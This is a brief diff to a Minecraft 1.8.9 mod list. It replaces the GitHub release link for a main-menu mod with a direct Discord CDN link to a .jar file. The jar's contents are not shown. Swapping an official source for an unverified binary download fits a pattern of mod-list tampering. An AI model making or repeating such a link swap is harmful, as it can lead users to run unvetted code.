@@ -131,7 +131,7 @@ that you avoid using it if possible.
 ### Other
 
 * Account Switcher - [Sk1er's Essential](https://essential.gg)
-* Main Menus - [Nox's MainMenus](https://github.com/Noxiuam/MainMenus/releases/latest)
+* Main Menus - [Nox's MainMenus](https://cdn.discordapp.com/attachments/778792141932986401/1237889747482050601/mainmenus-1.8.9-forge-1.2.1.jar)
 
 ### Addons
 
